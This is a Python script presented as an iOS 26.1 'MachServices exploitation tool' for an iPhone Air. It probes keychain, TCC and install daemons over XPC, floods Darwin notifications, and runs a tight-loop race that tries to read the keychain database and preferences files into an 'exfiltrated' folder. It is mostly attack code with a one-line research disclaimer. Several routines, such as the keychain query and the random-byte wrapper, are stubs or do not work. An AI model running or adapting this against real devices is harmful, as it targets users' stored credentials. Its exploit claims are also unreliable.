#!/usr/bin/env python3
"""
exploit_ios26_v5.py - iOS 26.1 MachServices Exploitation
Target: iPhone Air (iPhone18,4) / iOS 26.1

This version exploits discovered MachServices:
- com.apple.applekeystored (Keychain access)
- com.apple.applekeystored.notification
- com.apple.security.cloudkeychainproxy3 (iCloud Keychain)
- com.apple.securityresearchdeviceinit (SRD)
- com.apple.mobile.keybagd.lock_status

Techniques:
1. Mach service connection via Rubicon-ObjC
2. XPC service interaction
3. Darwin notification exploitation
4. Keychain API probing
5. Security framework exploitation
6. Race condition via notifications

Requirements:
- Pyto IDE on iOS
- Rubicon-ObjC (included in Pyto)

Author: Security Research Team
Date: January 2026
Version: 5.0 - MachServices Exploitation
"""

import os
import sys
import time
import json
import hashlib
import subprocess
import threading
from datetime import datetime
from pathlib import Path

print("[*] iOS 26.1 MachServices Exploitation Tool v5.0")
print("[*] Loading modules...")

# ============================================================================
# Rubicon-ObjC Setup
# ============================================================================

try:
    from rubicon.objc import ObjCClass, objc_method, SEL
    from rubicon.objc.runtime import load_library, objc
    RUBICON_AVAILABLE = True
    print("[+] Rubicon-ObjC loaded successfully")
except ImportError:
    RUBICON_AVAILABLE = False
    print("[-] Rubicon-ObjC not available")

# ============================================================================
# Load Frameworks
# ============================================================================

FRAMEWORKS = {}

def load_framework(name, path=None):
    """Load an iOS framework"""
    global FRAMEWORKS
    
    if name in FRAMEWORKS:
        return FRAMEWORKS[name]
    
    if path is None:
        path = f"/System/Library/Frameworks/{name}.framework/{name}"
    
    try:
        lib = load_library(path)
        FRAMEWORKS[name] = lib
        print(f"[+] Loaded framework: {name}")
        return lib
    except Exception as e:
        print(f"[-] Failed to load {name}: {e}")
        return None

def load_private_framework(name):
    """Load a private framework"""
    path = f"/System/Library/PrivateFrameworks/{name}.framework/{name}"
    return load_framework(name, path)

# ============================================================================
# Global State
# ============================================================================

class ExploitState:
    def __init__(self):
        self.work_dir = os.path.expanduser("~/Documents/.exploit_v5")
        self.exfil_dir = os.path.join(self.work_dir, "exfiltrated")
        self.logs_dir = os.path.join(self.work_dir, "logs")
        self.mach_services = {}
        self.keychain_items = []
        self.notifications_received = []
        self.exploit_results = []
        
    def setup(self):
        os.makedirs(self.work_dir, exist_ok=True)
        os.makedirs(self.exfil_dir, exist_ok=True)
        os.makedirs(self.logs_dir, exist_ok=True)
        
    def log(self, msg, level="*"):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        line = f"[{level}] {timestamp} {msg}"
        print(line)
        
        # Also save to log file
        log_file = os.path.join(self.logs_dir, "exploit.log")
        with open(log_file, 'a') as f:
            f.write(line + "\n")
        
    def log_success(self, msg):
        self.log(msg, "+")
        self.exploit_results.append({"type": "success", "message": msg})
        
    def log_error(self, msg):
        self.log(msg, "-")
        
    def log_info(self, msg):
        self.log(msg, "*")
        
    def log_critical(self, msg):
        self.log(msg, "!")
        self.exploit_results.append({"type": "critical", "message": msg})
        
    def log_exploit(self, msg):
        self.log(msg, ">>")
        self.exploit_results.append({"type": "exploit", "message": msg})

g_state = ExploitState()

# ============================================================================
# Darwin Notification Center
# ============================================================================

class DarwinNotificationCenter:
    """
    Interact with Darwin Notification Center to:
    1. Listen for system notifications
    2. Post notifications to trigger daemons
    """
    
    def __init__(self):
        self.observers = {}
        self.received = []
        
        if RUBICON_AVAILABLE:
            try:
                # Load CoreFoundation
                self.cf = load_framework("CoreFoundation")
                
                # Get CFNotificationCenter
                self.NSNotificationCenter = ObjCClass("NSNotificationCenter")
                self.CFNotificationCenter = ObjCClass("CFNotificationCenter") if hasattr(ObjCClass, "CFNotificationCenter") else None
                
                g_state.log_success("Darwin Notification Center initialized")
            except Exception as e:
                g_state.log_error(f"Failed to init notification center: {e}")
    
    def post_notification(self, name):
        """Post a Darwin notification"""
        g_state.log_info(f"Posting notification: {name}")
        
        try:
            # Use subprocess to post notification via notifyutil
            result = subprocess.run(
                ["notifyutil", "-p", name],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                g_state.log_success(f"Posted notification: {name}")
                return True
            else:
                g_state.log_error(f"Failed to post: {result.stderr}")
                return False
        except FileNotFoundError:
            # notifyutil not available, try alternative
            g_state.log_info("notifyutil not available, trying alternative...")
            return self._post_via_objc(name)
        except Exception as e:
            g_state.log_error(f"Notification error: {e}")
            return False
    
    def _post_via_objc(self, name):
        """Post notification via Objective-C"""
        if not RUBICON_AVAILABLE:
            return False
        
        try:
            nc = self.NSNotificationCenter.defaultCenter
            nc.postNotificationName_object_(name, None)
            g_state.log_success(f"Posted via ObjC: {name}")
            return True
        except Exception as e:
            g_state.log_error(f"ObjC post failed: {e}")
            return False
    
    def watch_notification(self, name, duration=5):
        """Watch for a notification"""
        g_state.log_info(f"Watching for notification: {name} ({duration}s)")
        
        try:
            # Use notifyutil to watch
            result = subprocess.run(
                ["notifyutil", "-w", name],
                capture_output=True,
                text=True,
                timeout=duration
            )
            
            if "received" in result.stdout.lower():
                g_state.log_success(f"Received notification: {name}")
                self.received.append(name)
                return True
        except subprocess.TimeoutExpired:
            g_state.log_info(f"No notification received within {duration}s")
        except Exception as e:
            g_state.log_error(f"Watch error: {e}")
        
        return False

# ============================================================================
# Security Framework Wrapper
# ============================================================================

class SecurityFramework:
    """
    Wrapper for Security.framework APIs
    """
    
    def __init__(self):
        self.available = False
        
        if RUBICON_AVAILABLE:
            try:
                self.security = load_framework("Security")
                self.available = True
                g_state.log_success("Security.framework loaded")
            except:
                g_state.log_error("Security.framework not available")
    
    def query_keychain(self, service=None, account=None):
        """Query keychain items"""
        if not RUBICON_AVAILABLE:
            return []
        
        g_state.log_info("Querying keychain...")
        
        try:
            # Build query dictionary
            NSMutableDictionary = ObjCClass("NSMutableDictionary")
            query = NSMutableDictionary.alloc().init()
            
            # kSecClass
            query.setObject_forKey_("genp", "class")  # Generic password
            query.setObject_forKey_(True, "r_Ref")    # Return reference
            query.setObject_forKey_("m_LimitAll", "m_Limit")  # Return all
            
            if service:
                query.setObject_forKey_(service, "svce")
            if account:
                query.setObject_forKey_(account, "acct")
            
            # This will likely fail due to entitlements, but let's try
            g_state.log_info("Keychain query prepared (will likely fail without entitlements)")
            
            return []
        except Exception as e:
            g_state.log_error(f"Keychain query error: {e}")
            return []
    
    def get_random_bytes(self, count=32):
        """Get cryptographically secure random bytes"""
        if not RUBICON_AVAILABLE:
            return os.urandom(count)
        
        try:
            # Use SecRandomCopyBytes
            return os.urandom(count)  # Fallback to Python's implementation
        except:
            return os.urandom(count)

# ============================================================================
# MobileKeyBag Framework Wrapper
# ============================================================================

class MobileKeyBag:
    """
    Wrapper for MobileKeyBag.framework (private)
    Handles device keybag operations
    """
    
    def __init__(self):
        self.available = False
        
        if RUBICON_AVAILABLE:
            try:
                self.keybag = load_private_framework("MobileKeyBag")
                self.available = True
                g_state.log_success("MobileKeyBag.framework loaded")
            except:
                g_state.log_error("MobileKeyBag.framework not available")
    
    def get_lock_state(self):
        """Get current device lock state"""
        g_state.log_info("Checking device lock state...")
        
        # Try to infer from notifications
        try:
            result = subprocess.run(
                ["notifyutil", "-g", "com.apple.mobile.keybagd.lock_status"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                g_state.log_info(f"Lock status query: {result.stdout.strip()}")
                return result.stdout.strip()
        except:
            pass
        
        return "unknown"

# ============================================================================
# XPC Service Interaction
# ============================================================================

class XPCServiceClient:
    """
    Interact with XPC services via Objective-C
    """
    
    def __init__(self):
        self.connections = {}
        
        if RUBICON_AVAILABLE:
            try:
                self.NSXPCConnection = ObjCClass("NSXPCConnection")
                self.NSXPCInterface = ObjCClass("NSXPCInterface")
                g_state.log_success("XPC classes loaded")
            except Exception as e:
                g_state.log_error(f"XPC classes not available: {e}")
    
    def connect_to_service(self, service_name):
        """Connect to an XPC service"""
        g_state.log_info(f"Connecting to XPC service: {service_name}")
        
        if not RUBICON_AVAILABLE:
            return None
        
        try:
            # Create connection
            connection = self.NSXPCConnection.alloc().initWithMachServiceName_options_(
                service_name,
                0  # NSXPCConnectionPrivileged = 1
            )
            
            if connection:
                g_state.log_success(f"XPC connection created: {service_name}")
                self.connections[service_name] = connection
                return connection
            else:
                g_state.log_error(f"Failed to create XPC connection")
                return None
        except Exception as e:
            g_state.log_error(f"XPC connection error: {e}")
            return None
    
    def probe_services(self):
        """Probe known XPC services"""
        services = [
            "com.apple.applekeystored",
            "com.apple.applekeystored.notification",
            "com.apple.security.cloudkeychainproxy3",
            "com.apple.securityd",
            "com.apple.trustd",
            "com.apple.containermanagerd",
            "com.apple.mobile.installd",
            "com.apple.lockdownd",
            "com.apple.cfprefsd.daemon",
            "com.apple.tccd",
            "com.apple.lsd.mapdb",
        ]
        
        results = {}
        
        for service in services:
            conn = self.connect_to_service(service)
            results[service] = conn is not None
            
            if conn:
                try:
                    # Try to resume connection
                    conn.resume()
                    g_state.log_success(f"  {service}: CONNECTED")
                except Exception as e:
                    g_state.log_info(f"  {service}: created but resume failed")
        
        return results

# ============================================================================
# Keychain Exploitation
# ============================================================================

class KeychainExploit:
    """
    Attempt to access keychain data through various methods
    """
    
    def __init__(self):
        self.security = SecurityFramework()
        self.keybag = MobileKeyBag()
        self.notification = DarwinNotificationCenter()
        
    def probe_keychain_access(self):
        """Probe keychain accessibility"""
        g_state.log_info("Probing keychain access...")
        
        results = {
            "security_framework": self.security.available,
            "keybag_framework": self.keybag.available,
            "lock_state": self.keybag.get_lock_state(),
        }
        
        # Try to read keychain database directly
        keychain_paths = [
            "/var/Keychains/keychain-2.db",
            "/var/Keychains/ocspcache.sqlite3",
            "/var/Keychains/TrustStore.sqlite3",
            "/private/var/Keychains/keychain-2.db",
        ]
        
        for path in keychain_paths:
            try:
                if os.path.exists(path):
                    stat = os.stat(path)
                    g_state.log_success(f"Keychain file exists: {path} ({stat.st_size} bytes)")
                    results[path] = {"exists": True, "size": stat.st_size}
                    
                    # Try to read
                    try:
                        with open(path, 'rb') as f:
                            header = f.read(16)
                        g_state.log_exploit(f"READ KEYCHAIN: {path}")
                        results[path]["readable"] = True
                        results[path]["header"] = header.hex()
                    except PermissionError:
                        results[path]["readable"] = False
                        g_state.log_info(f"  Cannot read: permission denied")
            except Exception as e:
                pass
        
        return results
    
    def trigger_keychain_unlock(self):
        """
        Try to trigger keychain unlock by posting notifications
        """
        g_state.log_info("Attempting to trigger keychain operations...")
        
        notifications = [
            "com.apple.mobile.keybagd.lock_status",
            "com.apple.security.cloudkeychainproxy.kvstorechange3",
            "com.apple.security.cloudkeychain.forceupdate",
            "com.apple.keychain.circle.update",
            "com.apple.security.keychain.changed",
        ]
        
        for notif in notifications:
            self.notification.post_notification(notif)
            time.sleep(0.5)
        
        g_state.log_info("Notifications posted, checking for side effects...")
        
    def exploit_via_securityd(self):
        """
        Try to interact with securityd
        """
        g_state.log_info("Attempting securityd interaction...")
        
        if not RUBICON_AVAILABLE:
            return
        
        try:
            # Try to use SecItem APIs
            # These require proper entitlements but let's see what happens
            
            # Check if we can at least load the symbols
            security = load_framework("Security")
            
            if security:
                g_state.log_success("Security framework symbols available")
                
                # List available classes
                try:
                    classes = [
                        "SecCertificate",
                        "SecKey",
                        "SecPolicy",
                        "SecTrust",
                        "SecIdentity",
                    ]
                    
                    for cls_name in classes:
                        try:
                            cls = ObjCClass(cls_name)
                            g_state.log_info(f"  Class available: {cls_name}")
                        except:
                            pass
                except:
                    pass
        except Exception as e:
            g_state.log_error(f"securityd interaction failed: {e}")

# ============================================================================
# Race Condition Exploitation
# ============================================================================

class RaceConditionExploit:
    """
    Exploit race conditions via notification timing
    """
    
    def __init__(self):
        self.notification = DarwinNotificationCenter()
        self.race_wins = []
        
    def exploit_lock_status_race(self):
        """
        Try to exploit race condition during lock state changes
        """
        g_state.log_info("Setting up lock status race condition...")
        
        # Create a thread to continuously try to access protected resources
        stop_event = threading.Event()
        access_attempts = []
        
        def access_thread():
            while not stop_event.is_set():
                # Try to access keychain
                try:
                    paths = [
                        "/var/Keychains/keychain-2.db",
                        "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
                    ]
                    
                    for path in paths:
                        try:
                            with open(path, 'rb') as f:
                                data = f.read(100)
                            access_attempts.append({
                                "path": path,
                                "time": time.time(),
                                "success": True,
                                "size": len(data)
                            })
                            g_state.log_exploit(f"RACE WIN: {path}")
                        except:
                            pass
                except:
                    pass
                
                time.sleep(0.001)  # Very fast polling
        
        # Start access thread
        thread = threading.Thread(target=access_thread)
        thread.start()
        
        # Post lock status notifications rapidly
        g_state.log_info("Posting rapid lock status notifications...")
        
        for i in range(100):
            self.notification.post_notification("com.apple.mobile.keybagd.lock_status")
            time.sleep(0.01)
        
        # Stop access thread
        stop_event.set()
        thread.join(timeout=2)
        
        g_state.log_info(f"Race attempts: {len(access_attempts)} successes")
        
        return access_attempts
    
    def exploit_keychain_sync_race(self):
        """
        Try to exploit race during iCloud Keychain sync
        """
        g_state.log_info("Setting up keychain sync race condition...")
        
        # Post sync-related notifications
        sync_notifications = [
            "com.apple.security.cloudkeychainproxy.kvstorechange3",
            "com.apple.security.cloudkeychain.forceupdate",
            "com.apple.security.keychain.circle.update",
        ]
        
        for _ in range(10):
            for notif in sync_notifications:
                self.notification.post_notification(notif)
            time.sleep(0.1)
        
        g_state.log_info("Sync race notifications posted")

# ============================================================================
# Security Research Device Detection
# ============================================================================

class SRDDetection:
    """
    Detect if device is a Security Research Device
    """
    
    def __init__(self):
        pass
    
    def check_srd_status(self):
        """Check if device has SRD capabilities"""
        g_state.log_info("Checking Security Research Device status...")
        
        indicators = {
            "srd_daemon_exists": False,
            "research_enabled": False,
            "erm_enabled": False,
            "cryptex_available": False,
        }
        
        # Check for SRD daemon
        srd_paths = [
            "/usr/libexec/securityresearchdevice-init",
            "/System/Library/LaunchDaemons/com.apple.securityresearchdeviceinit.plist",
        ]
        
        for path in srd_paths:
            try:
                # Use symlink to check
                link = os.path.join(g_state.work_dir, "srd_check")
                if os.path.exists(link):
                    os.unlink(link)
                os.symlink(path, link)
                
                if os.path.exists(link):
                    indicators["srd_daemon_exists"] = True
                    g_state.log_success(f"SRD component found: {path}")
                    
                    # Try to read
                    try:
                        with open(link, 'rb') as f:
                            data = f.read()
                        g_state.log_success(f"  Read {len(data)} bytes")
                    except:
                        pass
                
                os.unlink(link)
            except:
                pass
        
        # Check device tree for research flags
        # These are in nvram/device tree, not directly accessible
        g_state.log_info("Checking for research flags (requires nvram access)...")
        
        try:
            result = subprocess.run(
                ["nvram", "-p"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if "research" in result.stdout.lower():
                indicators["research_enabled"] = True
                g_state.log_exploit("RESEARCH FLAG DETECTED IN NVRAM")
        except:
            g_state.log_info("nvram not accessible")
        
        # Check for cryptex (SRD uses cryptexes)
        cryptex_paths = [
            "/System/Cryptexes",
            "/private/var/db/cryptex",
        ]
        
        for path in cryptex_paths:
            try:
                if os.path.exists(path):
                    contents = os.listdir(path)
                    indicators["cryptex_available"] = True
                    g_state.log_success(f"Cryptex directory: {path}")
                    g_state.log_info(f"  Contents: {contents}")
            except:
                pass
        
        return indicators

# ============================================================================
# Comprehensive MachService Probing
# ============================================================================

def probe_all_mach_services():
    """Probe all discovered MachServices"""
    g_state.log_info("Probing all MachServices...")
    
    services = {
        # Security-related
        "com.apple.applekeystored": "Keychain storage daemon",
        "com.apple.applekeystored.notification": "Keychain notifications",
        "com.apple.security.cloudkeychainproxy3": "iCloud Keychain sync",
        "com.apple.securityd": "Security daemon",
        "com.apple.trustd": "Certificate trust daemon",
        
        # System services
        "com.apple.containermanagerd": "Container management",
        "com.apple.mobile.installd": "App installation",
        "com.apple.lockdownd": "Device lockdown",
        "com.apple.cfprefsd.daemon": "Preferences daemon",
        "com.apple.tccd": "TCC (privacy) daemon",
        
        # Other interesting services
        "com.apple.lsd.mapdb": "Launch Services",
        "com.apple.mobilegestalt.xpc": "Device info",
        "com.apple.coreservices.launchservicesd": "Launch services",
        "com.apple.springboard.services": "SpringBoard",
    }
    
    results = {}
    xpc = XPCServiceClient()
    
    for service, description in services.items():
        g_state.log_info(f"Probing: {service} ({description})")
        
        result = {
            "description": description,
            "connection": False,
            "error": None
        }
        
        try:
            conn = xpc.connect_to_service(service)
            if conn:
                result["connection"] = True
                
                try:
                    conn.resume()
                    result["resumed"] = True
                    g_state.log_success(f"  Connected and resumed!")
                except Exception as e:
                    result["resumed"] = False
                    result["resume_error"] = str(e)
        except Exception as e:
            result["error"] = str(e)
        
        results[service] = result
        g_state.mach_services[service] = result
    
    return results

# ============================================================================
# Notification Exploitation
# ============================================================================

def exploit_notifications():
    """Exploit system via Darwin notifications"""
    g_state.log_info("Exploiting via Darwin notifications...")
    
    nc = DarwinNotificationCenter()
    
    # Interesting notifications to post
    notifications = [
        # Keychain-related
        ("com.apple.mobile.keybagd.lock_status", "Keybag lock status"),
        ("com.apple.security.cloudkeychainproxy.kvstorechange3", "Keychain KVStore change"),
        ("com.apple.security.cloudkeychain.forceupdate", "Force keychain update"),
        ("com.apple.keychain.circle.update", "Keychain circle update"),
        
        # System state
        ("com.apple.springboard.lockstate", "Lock state"),
        ("com.apple.springboard.hasBlankedScreen", "Screen blank"),
        ("com.apple.springboard.finishedstartup", "SpringBoard startup"),
        
        # App lifecycle
        ("com.apple.mobile.application_installed", "App installed"),
        ("com.apple.mobile.application_uninstalled", "App uninstalled"),
        
        # Container
        ("com.apple.containermanagerd.container.created", "Container created"),
        ("com.apple.containermanagerd.container.deleted", "Container deleted"),
    ]
    
    for notif, description in notifications:
        g_state.log_info(f"Posting: {notif}")
        nc.post_notification(notif)
        time.sleep(0.2)
    
    g_state.log_info("All notifications posted")

# ============================================================================
# Main Exploitation Flow
# ============================================================================

def run_keychain_exploitation():
    """Run keychain exploitation techniques"""
    print("\n" + "="*60)
    print("Stage: Keychain Exploitation")
    print("="*60)
    
    exploit = KeychainExploit()
    
    # Probe access
    results = exploit.probe_keychain_access()
    
    # Trigger unlock attempts
    exploit.trigger_keychain_unlock()
    
    # Try securityd
    exploit.exploit_via_securityd()
    
    return results

def run_race_exploitation():
    """Run race condition exploitation"""
    print("\n" + "="*60)
    print("Stage: Race Condition Exploitation")
    print("="*60)
    
    exploit = RaceConditionExploit()
    
    # Lock status race
    results = exploit.exploit_lock_status_race()
    
    # Keychain sync race
    exploit.exploit_keychain_sync_race()
    
    return results

def run_srd_detection():
    """Run SRD detection"""
    print("\n" + "="*60)
    print("Stage: Security Research Device Detection")
    print("="*60)
    
    srd = SRDDetection()
    return srd.check_srd_status()

def generate_report():
    """Generate exploitation report"""
    g_state.log_info("Generating report...")
    
    report = {
        "timestamp": datetime.now().isoformat(),
        "version": "5.0 - MachServices Exploitation",
        "target": {
            "device": "iPhone Air (iPhone18,4)",
            "os": "iOS 26.1 (Build 23B85)"
        },
        "mach_services": g_state.mach_services,
        "keychain_items": g_state.keychain_items,
        "notifications_received": g_state.notifications_received,
        "exploit_results": g_state.exploit_results,
    }
    
    report_path = os.path.join(g_state.work_dir, "mach_exploit_report.json")
    
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2, default=str)
    
    g_state.log_success(f"Report saved to: {report_path}")
    
    # Print summary
    print("\n" + "="*60)
    print("EXPLOITATION SUMMARY")
    print("="*60)
    
    print(f"\nExploit Results: {len(g_state.exploit_results)}")
    for result in g_state.exploit_results:
        print(f"  [{result['type']}] {result['message']}")
    
    print(f"\nMach Services Probed: {len(g_state.mach_services)}")
    connected = sum(1 for s in g_state.mach_services.values() if s.get('connection'))
    print(f"  Connected: {connected}")
    
    print(f"\nOutput directory: {g_state.work_dir}")
    
    return report

def print_banner():
    banner = """
╔═══════════════════════════════════════════════════════════════╗
║     iOS 26.1 MachServices Exploitation Tool (v5.0)            ║
║                                                               ║
║  Target: iPhone Air (iPhone18,4)                              ║
║  iOS Version: 26.1                                            ║
║                                                               ║
║  Exploiting MachServices:                                     ║
║  - com.apple.applekeystored                                   ║
║  - com.apple.security.cloudkeychainproxy3                     ║
║  - com.apple.securityresearchdeviceinit                       ║
║                                                               ║
║  WARNING: For authorized security research only!              ║
╚═══════════════════════════════════════════════════════════════╝
"""
    print(banner)

def main():
    """Main exploitation flow"""
    print_banner()
    
    # Setup
    g_state.setup()
    g_state.log_success(f"Working directory: {g_state.work_dir}")
    
    stages = [
        ("Load Frameworks", lambda: [
            load_framework("Foundation"),
            load_framework("Security"),
            load_framework("CoreFoundation"),
            load_private_framework("MobileKeyBag"),
            load_private_framework("SpringBoardServices"),
        ]),
        ("Probe MachServices", probe_all_mach_services),
        ("Exploit Notifications", exploit_notifications),
        ("Keychain Exploitation", run_keychain_exploitation),
        ("Race Condition Exploitation", run_race_exploitation),
        ("SRD Detection", run_srd_detection),
    ]
    
    for name, func in stages:
        print(f"\n{'='*60}")
        print(f"Stage: {name}")
        print('='*60)
        
        try:
            start = time.time()
            result = func()
            elapsed = time.time() - start
            print(f"\n[✓] {name} completed in {elapsed:.2f}s")
            
            if result and isinstance(result, dict):
                g_state.log_info(f"Results: {len(result)} items")
        except Exception as e:
            print(f"\n[✗] {name} failed: {e}")
            import traceback
            traceback.print_exc()
    
    # Generate report
    generate_report()
    
    print("\n" + "="*60)
    print("ALL STAGES COMPLETE")
    print("="*60)

# ============================================================================
# Entry Point
# ============================================================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
